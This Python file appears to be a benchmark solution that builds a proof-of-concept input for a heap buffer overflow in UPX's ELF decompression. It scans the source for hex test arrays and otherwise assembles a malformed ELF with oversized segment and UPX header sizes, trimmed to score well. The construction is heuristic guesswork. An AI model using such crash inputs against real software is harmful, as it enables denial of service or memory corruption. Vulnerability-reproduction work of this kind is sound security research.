import os
import tarfile
import tempfile
import subprocess
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory of the source
            extracted_items = os.listdir(tmpdir)
            if len(extracted_items) == 1:
                source_root = os.path.join(tmpdir, extracted_items[0])
            else:
                source_root = tmpdir
            
            # Look for test cases or patterns in the source code
            poc = self._generate_poc_from_source(source_root)
            
            # If no specific pattern found, generate a minimal ELF-like structure
            # that might trigger the buffer overflow based on the vulnerability description
            if poc is None:
                poc = self._generate_minimal_poc()
            
            return poc
    
    def _generate_poc_from_source(self, source_root: str) -> bytes | None:
        # Look for existing test cases or patterns in the source
        test_cases = []
        for root, dirs, files in os.walk(source_root):
            for file in files:
                if file.endswith(('.c', '.cpp', '.h')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for patterns that might indicate buffer overflow
                            if 'file_image' in content and 'lowmem' in content:
                                # Try to extract test cases or example inputs
                                test_cases.extend(self._extract_test_cases(content))
                    except:
                        continue
        
        if test_cases:
            # Return the smallest test case found
            return min(test_cases, key=len)
        
        return None
    
    def _extract_test_cases(self, content: str) -> list[bytes]:
        # Simple heuristic: look for hex arrays or byte strings
        cases = []
        lines = content.split('\n')
        hex_patterns = []
        
        for line in lines:
            if '{' in line and '}' in line and '0x' in line:
                # Try to parse hex array
                try:
                    hex_str = line[line.find('{'):line.find('}')+1]
                    hex_bytes = []
                    for part in hex_str.split(','):
                        part = part.strip()
                        if part.startswith('0x'):
                            hex_bytes.append(int(part, 16))
                    if hex_bytes:
                        cases.append(bytes(hex_bytes))
                except:
                    continue
        
        return cases
    
    def _generate_minimal_poc(self) -> bytes:
        # Generate a minimal ELF-like structure that might trigger the vulnerability
        # Based on the description: heap buffer overflow in ELF decompression
        # with improper resetting of ph.method and unsafe lowmem usage
        
        # Start with ELF header (64-bit)
        poc = b''
        
        # ELF magic
        poc += b'\x7fELF'
        # Class (64-bit)
        poc += b'\x02'
        # Data (little endian)
        poc += b'\x01'
        # Version
        poc += b'\x01'
        # OS ABI (System V)
        poc += b'\x00'
        # ABI Version + padding
        poc += bytes(7)
        # Type (shared object)
        poc += b'\x03\x00'
        # Machine (x86_64)
        poc += b'\x3e\x00'
        # Version
        poc += b'\x01\x00\x00\x00'
        # Entry point (0)
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # Program header offset
        poc += b'\x40\x00\x00\x00\x00\x00\x00\x00'
        # Section header offset (0 for now)
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # Flags
        poc += b'\x00\x00\x00\x00'
        # ELF header size
        poc += b'\x40\x00'
        # Program header entry size
        poc += b'\x38\x00'
        # Program header count (1)
        poc += b'\x01\x00'
        # Section header entry size
        poc += b'\x40\x00'
        # Section header count
        poc += b'\x00\x00'
        # Section header string table index
        poc += b'\x00\x00'
        
        # Program header (PT_LOAD)
        # Type (loadable segment)
        poc += b'\x01\x00\x00\x00'
        # Flags (RWX)
        poc += b'\x07\x00\x00\x00'
        # Offset
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # Virtual address
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # Physical address
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        # File size (large to trigger overflow)
        poc += b'\xff\xff\xff\xff\xff\xff\xff\xff'
        # Memory size (even larger)
        poc += b'\xff\xff\xff\xff\xff\xff\xff\xff'
        # Alignment
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # Add some compressed data header that might trigger the vulnerability
        # b_info structure with large sizes
        poc += b'UPX!'  # UPX magic
        poc += b'\xff\xff\xff\xff'  # Large compressed size
        poc += b'\xff\xff\xff\xff'  # Large uncompressed size
        poc += b'\x01'  # b_method
        poc += b'\x00' * 3  # Padding
        
        # Add DT_INIT dynamic tag to trigger un_DT_INIT()
        poc += b'\x0c\x00\x00\x00\x00\x00\x00\x00'  # DT_INIT tag
        poc += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # DT_INIT value
        
        # Fill with pattern that might trigger the overflow
        # Pattern to overwrite lowmem boundaries
        pattern = b'A' * 100 + b'B' * 100 + b'C' * 100
        poc += pattern
        
        # Ensure total length is minimal but enough to trigger
        # Target length less than 512 for better score
        target_len = 256
        
        if len(poc) > target_len:
            poc = poc[:target_len]
        else:
            # Pad to target length
            poc += b'\x00' * (target_len - len(poc))
        
        return poc